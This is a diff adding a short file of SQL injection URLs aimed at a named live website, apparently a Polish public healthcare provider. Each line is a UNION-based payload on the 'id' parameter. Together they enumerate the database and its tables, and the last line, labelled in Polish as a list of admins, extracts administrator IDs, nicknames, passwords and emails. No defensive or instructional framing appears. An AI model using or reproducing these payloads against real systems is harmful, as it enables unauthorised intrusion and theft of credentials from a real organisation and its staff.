@@ -1,0 +1,16 @@
+http://www.spzozkolo.pl/informacja.php?id=-1 union select 1, database();--
+
+ latin1_swedish_ci
+
+http://www.spzozkolo.pl/informacja.php?id=-1 union select null, (SELECT CONVERT(table_name USING utf8) FROM information_schema.columns) as 'x'--
+http://www.spzozkolo.pl/informacja.php?id=-1 union select null, COLLATION_NAME
+
+http://www.spzozkolo.pl/informacja.php?id=-1 union select null, (SELECT CONVERT(table_name USING latin1) FROM information_schema.columns) as  'x '--
+
+http://www.spzozkolo.pl/informacja.php?id=-1 union select null, (SELECT group_concat(CONVERT(table_name USING latin1) SEPARATOR  ' %3Cbr%3E ') FROM information_schema.columns WHERE TABLE_SCHEMA= 'spzoz ') as  'x '--
+
+http://www.spzozkolo.pl/informacja.php?id=-1 union select null, (SELECT group_concat(CONVERT(table_name USING latin1) SEPARATOR  ' <br> ') FROM information_schema.columns WHERE TABLE_SCHEMA= 'spzoz');
+
+
+LISTA adminów:
+http://www.spzozkolo.pl/informacja.php?id=-1%20union%20select%20null,%20(SELECT%20group_concat(id,%20%27%3Cbr%3E%27,%20nick%20,%20%27%3Cbr%3E%27,%20pass%20,%20%27%3Cbr%3E%27,%20mail%20SEPARATOR%20%27%20%3Cbr%3E%3Cbr%3E%27)%20FROM%20`admins`);
